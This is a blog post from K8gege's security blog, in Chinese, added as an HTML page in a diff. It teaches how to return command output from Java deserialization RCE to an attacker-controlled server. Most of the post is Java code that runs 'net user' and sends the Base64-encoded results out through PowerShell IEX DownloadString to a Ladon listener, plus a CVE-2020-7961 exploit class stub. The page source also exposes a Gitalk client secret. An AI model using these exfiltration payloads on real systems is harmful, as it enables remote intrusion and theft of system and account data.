@@ -1,0 +1,412 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="JAVA,反序列化,命令回显">
+
+
+<meta name="description" content=" 
+
+
+简介
+在JAVA反序列化漏洞中，可能会有一些漏洞无法直接回显，这时我们可能需外带，通过WEB、FTP、DNS等外带，但是我不喜欢把自己的结果传到别人的网站上，本文教大家如何把结果回显到自...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    JAVA反序列化漏洞命令执行回显方法 |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="JAVA反序列化漏洞命令执行回显方法">
+            
+            JAVA反序列化漏洞命令执行回显方法
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/Ladon/">Ladon</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/JAVA/" rel="tag">JAVA</a> <a class="tag-none-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a> <a class="tag-none-link" href="/tags/%E5%91%BD%E4%BB%A4%E5%9B%9E%E6%98%BE/" rel="tag">命令回显</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2021/03/05</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                1505</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p style="color:#fff;"> 
+&lt;% 
+<span class="archive-article-date">
+Visit <span id="busuanzi_value_page_pv"></span>
+</span>
+%&gt;
+</p>
+<h3 id="简介">简介</h3>
+<p>在JAVA反序列化漏洞中，可能会有一些漏洞无法直接回显，这时我们可能需外带，通过WEB、FTP、DNS等外带，但是我不喜欢把自己的结果传到别人的网站上，本文教大家如何把结果回显到自己的VPS上，本文主要是JAVA代码，其它命令执行漏洞同理。</p>
+<script language="javascript" type="text/javascript">
+window.location.href="http://k8gege.org/Ladon/web_javarce.html";
+</script>
+<h3 id="启动WEB">启动WEB</h3>
+<p>Ladon web 9001</p>
+<h3 id="JAVA执行命令">JAVA执行命令</h3>
+<p>javac main.java &amp; java main<br>
+注意：get提交换行符需换成别的字符</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">public class main</span><br><span class="line">{</span><br><span class="line">public static void main(String[] args)</span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">try {</span><br><span class="line">BufferedReader br = new BufferedReader(new InputStreamReader(runtime.exec(<span class="string">"net user"</span>).getInputStream()));</span><br><span class="line">String line=null;</span><br><span class="line">StringBuffer b=new StringBuffer();</span><br><span class="line"><span class="keyword">while</span> ((line=br.readLine())!=null) {</span><br><span class="line">b.append(line+<span class="string">" "</span>);</span><br><span class="line">}</span><br><span class="line">System.out.println(b.toString());</span><br><span class="line">String[] cmd = {<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, <span class="string">"powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.126:9001/getstr/"</span>,b.toString(),<span class="string">"')"</span>};</span><br><span class="line"></span><br><span class="line">//java.lang.Runtime.getRuntime().<span class="built_in">exec</span>(cmd).waitFor();</span><br><span class="line">java.lang.Runtime.getRuntime().<span class="built_in">exec</span>(cmd);</span><br><span class="line">} catch (Exception e) {</span><br><span class="line">e.printStackTrace();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/webjavarcestr/whoami.PNG"></p>
+<h3 id="返回多行结果">返回多行结果</h3>
+<p>只返回whoami结果没什么问题，但是多行无法提交，原因在换行符这里 所以不要换行符<br>
+返回结果 K8飞刀  8.0之前 URL编码(UTF8)解码 下一版本Ladon需做下解析处理或POST提交</p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/webjavarcestr/getstr.PNG"></p>
+<h3 id="BASE64提交">BASE64提交</h3>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.126:9001/getbase64">http://192.168.1.126:9001/getbase64</a>     提交的结果BASE64加密<br>
+<a target="_blank" rel="noopener" href="http://192.168.1.126:9001/debase64">http://192.168.1.126:9001/debase64</a>      提交的base64结果解密</p>
+<p>注意提交不要包含空格，以免Ladon无法解密</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">//main.java</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.util.Base64.Encoder;</span><br><span class="line">import java.util.Base64;//jdk 1.8</span><br><span class="line">public class main</span><br><span class="line">{</span><br><span class="line">    public static void main(String[] args)</span><br><span class="line">    {</span><br><span class="line">        </span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        try {</span><br><span class="line">            BufferedReader br = new BufferedReader(new InputStreamReader(runtime.exec(<span class="string">"net user"</span>).getInputStream()));</span><br><span class="line">            String line=null;</span><br><span class="line">            StringBuffer b=new StringBuffer();</span><br><span class="line">            <span class="keyword">while</span> ((line=br.readLine())!=null) {</span><br><span class="line">                b.append(line+<span class="string">" "</span>);</span><br><span class="line">            }</span><br><span class="line">            System.out.println(b.toString());</span><br><span class="line">            </span><br><span class="line">        Encoder encoder = Base64.getEncoder();</span><br><span class="line">        byte[] encode = encoder.encode(b.toString().getBytes());</span><br><span class="line">        String encodeStr = new String(encode);</span><br><span class="line">        System.out.println(encodeStr);</span><br><span class="line">        </span><br><span class="line">            //String[] cmd = {<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, <span class="string">"powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.126:9001/getstr/"</span>,b.toString(),<span class="string">"')"</span>};</span><br><span class="line">            </span><br><span class="line">String[] cmd = {<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, <span class="string">"powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.126:9001/debase64/"</span>,encodeStr,<span class="string">"')"</span>};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            //java.lang.Runtime.getRuntime().<span class="built_in">exec</span>(cmd).waitFor();</span><br><span class="line">            java.lang.Runtime.getRuntime().<span class="built_in">exec</span>(cmd);</span><br><span class="line">        } catch (Exception e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>这样写会多出一个空格<br>
+String[] cmd = {“cmd.exe”, “/c”, “powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://192.168.1.126:9001/debase64/%22,encodeStr,%22">http://192.168.1.126:9001/debase64/“,encodeStr,”</a>’)”};</p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/webjavarcestr/base64.PNG"></p>
+<p>这样写就没有空格<br>
+String[] cmd = {“cmd.exe”, “/c”, “powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://192.168.1.126:9001/debase64/%22+encodeStr,%22">http://192.168.1.126:9001/debase64/“+encodeStr,”</a>’)”};</p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/webjavarcestr/debase64.PNG"></p>
+<h3 id="解决中文乱码">解决中文乱码</h3>
+<p>提交的base64结果使用UTF-8编码</p>
+<pre><code>    Encoder encoder = Base64.getEncoder();
+    //byte[] encode = encoder.encode("hello".getBytes("UTF-8"));
+    byte[] encode = encoder.encode(b.toString().getBytes("UTF-8"));
+    String encodeStr = new String(encode);
+    System.out.println(encodeStr);
+</code></pre>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/webjavarcestr/b640k.PNG"></p>
+<h3 id="完美回显">完美回显</h3>
+<p>由于是BASE64加密提交的，所以什么符号都可以，这样我们可以把换行加上去,得到完美回显<br>
+其它漏洞回显解决方案同理，包括不仅限于WEB漏洞，本文只是用JAVA的反序列漏洞做例子</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">//main.java</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.util.Base64.Encoder;</span><br><span class="line">import java.util.Base64;//jdk 1.8</span><br><span class="line">public class main</span><br><span class="line">{</span><br><span class="line">    public static void main(String[] args)</span><br><span class="line">    {</span><br><span class="line">        </span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        try {</span><br><span class="line">            BufferedReader br = new BufferedReader(new InputStreamReader(runtime.exec(<span class="string">"net user"</span>).getInputStream()));</span><br><span class="line">            String line=null;</span><br><span class="line">            StringBuffer b=new StringBuffer();</span><br><span class="line">            <span class="keyword">while</span> ((line=br.readLine())!=null) {</span><br><span class="line">                b.append(line+<span class="string">"\n"</span>);</span><br><span class="line">            }</span><br><span class="line">            System.out.println(b.toString());</span><br><span class="line">            </span><br><span class="line">        Encoder encoder = Base64.getEncoder();</span><br><span class="line">        byte[] encode = encoder.encode(b.toString().getBytes());</span><br><span class="line">        String encodeStr = new String(encode);</span><br><span class="line">        System.out.println(encodeStr);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">String[] cmd = {<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, <span class="string">"powershell -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.126:9001/debase64/"</span>+encodeStr,<span class="string">"')"</span>};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            //java.lang.Runtime.getRuntime().<span class="built_in">exec</span>(cmd).waitFor();</span><br><span class="line">            java.lang.Runtime.getRuntime().<span class="built_in">exec</span>(cmd);</span><br><span class="line">        } catch (Exception e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>将以上代码稍微修改一下集成到以下POC里，如CVE-2020-7961 RCE漏洞，编译成class</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//LifExp.java</span><br><span class="line">public class LifExp {</span><br><span class="line">    static {</span><br><span class="line">        try {</span><br><span class="line">            String[] cmd = {<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, <span class="string">"calc.exe"</span>};</span><br><span class="line">            java.lang.Runtime.getRuntime().</span><br><span class="line"><span class="built_in">exec</span>(cmd).waitFor();</span><br><span class="line">        } catch ( Exception e ) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p><img alt="使用http访问查看图片" data-original="/k8img/posts/webjavarcestr/ipconfig.PNG"></p>
+<h3 id="Download">Download</h3>
+<h4 id="LadonGo-ALL-OS">LadonGo (ALL OS)</h4>
+<p><a target="_blank" rel="noopener" href="https://github.com/k8gege/LadonGo/releases">https://github.com/k8gege/LadonGo/releases</a></p>
+<h4 id="Ladon-Windows-Cobalt-Strike">Ladon (Windows &amp; Cobalt Strike)</h4>
+<p>历史版本: <a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon/releases">https://github.com/k8gege/Ladon/releases</a><br>
+7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>
+8.0版本：K8小密圈</p>
+<div style="text-align: center; width: 710px; border: green solid 0px;">
+<img alt="" style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
+</div>
+
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/FindExchange.html" class="pre-post btn btn-default" title="〖教程〗Ladon内网扫描探测Exchange服务器">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            〖教程〗Ladon内网扫描探测Exchange服务器</span>
+    </a>
+    
+    
+    <a href="/p/Ladon_diypoc.html" class="next-post btn btn-default" title="〖编程〗Ladon自定义POC插件模块编写">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            〖编程〗Ladon自定义POC插件模块编写</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8WEB"><span class="toc-text">启动WEB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JAVA%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">JAVA执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%94%E5%9B%9E%E5%A4%9A%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="toc-text">返回多行结果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BASE64%E6%8F%90%E4%BA%A4"><span class="toc-text">BASE64提交</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81"><span class="toc-text">解决中文乱码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E7%BE%8E%E5%9B%9E%E6%98%BE"><span class="toc-text">完美回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Download"><span class="toc-text">Download</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LadonGo-ALL-OS"><span class="toc-text">LadonGo (ALL OS)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ladon-Windows-Cobalt-Strike"><span class="toc-text">Ladon (Windows &amp; Cobalt Strike)</span></a></li></ol></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
